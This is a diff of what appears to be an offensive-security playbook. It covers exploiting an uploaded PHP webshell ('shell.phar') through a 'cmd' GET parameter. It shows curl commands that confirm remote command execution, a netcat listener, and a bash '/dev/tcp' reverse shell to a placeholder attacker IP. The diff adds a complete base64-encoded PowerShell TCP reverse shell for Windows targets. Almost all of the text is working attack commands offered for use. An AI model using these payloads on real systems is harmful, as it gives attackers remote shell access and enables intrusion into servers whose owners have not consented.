@@ -625,8 +625,7 @@ CMD_PARAM='cmd'                                    # matches the `cmd` param the
 Fire:
 
 ```bash
-curl -sG "${GET_FLAGS[@]}" "http://$HOST:$PORT${RETRIEVAL_PATH:?set RETRIEVAL_PATH first e.g. RETRIEVAL_PATH=/uploads/documents/shell.phar}" --data-urlencode "cmd=id" \
-  | grep -oE 'uid=[0-9]+\([^)]*\)|<title>[^<]*</title>|<\?php[^?]*\?>|<%[^%]*%>'
+curl -sG "${GET_FLAGS[@]}" "http://$host:$port${RETRIEVAL_PATH:?set RETRIEVAL_PATH first}" --data-urlencode "cmd=id"
 ```
 
 Route on grep output:
@@ -685,14 +684,19 @@ RCE confirmed via GET-parameter command exec. Upgrade to interactive shell.
 
 On attacker: `nc -lvnp <attacker_port>`
 
-Trigger via the webshell:
+Trigger via the webshell (replace `<attacker_ip>` and `<attacker_port>`):
+
+**Linux**
 
 ```bash
-curl -sG "${GET_FLAGS[@]}" "http://$HOST:$PORT$RETRIEVAL_PATH" \
+curl -sG "${GET_FLAGS[@]}" "http://$host:$port$RETRIEVAL_PATH" \
   --data-urlencode "$CMD_PARAM=bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'"
 ```
 
-curl's `--data-urlencode` handles all encoding — the single quotes, `&`, `>`, `/` are URL-encoded on the wire, then decoded by the server into `$_GET`, then passed to `system()` which runs the shell command.
+**Windows**
+
+`curl -sG "${GET_FLAGS[@]}" "http://$host:$port$RETRIEVAL_PATH" --data-urlencode "$CMD_PARAM=powershell -nop -enc $(printf '%s' '$c=New-Object System.Net.Sockets.TCPClient("<attacker_ip>",<attacker_port>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()' | iconv -t UTF-16LE | base64 -w0)"`
+
 
 ⚠️ Bash reverse-shell requires bash on target. If target is minimal (Alpine / BusyBox / no bash), fall back to alternatives from [[Web Shells]] — `nc -e`, python one-liner, perl one-liner.
 
